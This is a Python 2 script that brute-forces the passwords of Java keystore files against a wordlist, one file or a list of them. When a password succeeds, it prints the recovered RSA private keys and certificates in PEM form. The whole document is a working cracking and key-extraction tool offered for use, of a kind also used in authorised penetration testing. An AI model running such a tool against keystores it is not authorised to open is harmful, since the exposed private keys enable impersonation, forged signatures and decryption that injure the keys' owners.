#!/usr/bin/python

# Author: Felipe Molina de la Torre (@felmoltor)
# Date: 04/2015
# License: GPLv3
# Summary:  This script execute a dictionary attack against the typical java ".keystore" files
#           Just provide the path to the keystore and the dictionary and will try to unlock
#           the keystore with all the password of the dictionary

import sys, base64, textwrap
import jks
from optparse import OptionParser
from termcolor import colored

def getoptions():
    usage = "usage: %prog [options] arg1 arg2"
    parser = OptionParser(usage=usage)
    parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="Show password being tested [default: False]")
    parser.add_option("-k", "--keystore",metavar="FILE",dest="keystore", help="Keystore to crack")
    parser.add_option("-K", "--keystore-list",metavar="FILE", dest="keystorefile", default=None, help="A file with a list of keystores to crack")
    parser.add_option("-d", "--dictionary", default="dictionary.txt",dest="dictionary",help="Dictionary to use in the brute force")
    (options,args) = parser.parse_args()
    return options

def print_pem(data, type):
    print "-----BEGIN %s-----" % type
    print "\r\n".join(textwrap.wrap(base64.b64encode(data), 64))
    print "-----END %s-----" % type

def dictionaryAttack(keystore,dictionary):
    foundpwd=False
    df = open(dictionary,"r")
    print colored("=======================================","blue")
    print colored("Brute forcing keystore file '%s'" % keystore,"blue")
    print colored("=======================================","blue")
    for passw in df.readlines():
        passw=passw.strip()
        try:
            ks = jks.KeyStore.load(keystore, passw)
            print colored(" + Valid password found! '%s'" % passw,"green")
            dumpPrivateKey(ks)
            foundpwd=True
            break
        except Exception as e:
            if options.verbose:
                print colored(" - Invalid password '%s'" % passw,"red")
    if not foundpwd:
        print colored(" A valid password couln't be found :-(","red")
    print

def dumpPrivateKey(ks):
    for pk in ks.private_keys:
        print "Private key: %s" % pk.alias
        print_pem(pk.pkey, "RSA PRIVATE KEY")
    
    for c in pk.cert_chain:
        print_pem(c[1], "CERTIFICATE")
        print

    for c in ks.certs:
        print "Certificate: %s" % c.alias
        print_pem(c.cert, "CERTIFICATE")
        print  

# ======== #
# = MAIN = #
# ======== #

options = getoptions()

if options.keystorefile is not None:
    kslistf = open(options.keystorefile,"r")
    for ksfile in kslistf.readlines():
        ksfile=ksfile.strip()
        dictionaryAttack(ksfile,options.dictionary)
elif options.keystore is not None:
    dictionaryAttack(options.keystore,options.dictionary)
else:
    print "Error. Provide a keystore file name or a keystore list"
    exit(1)


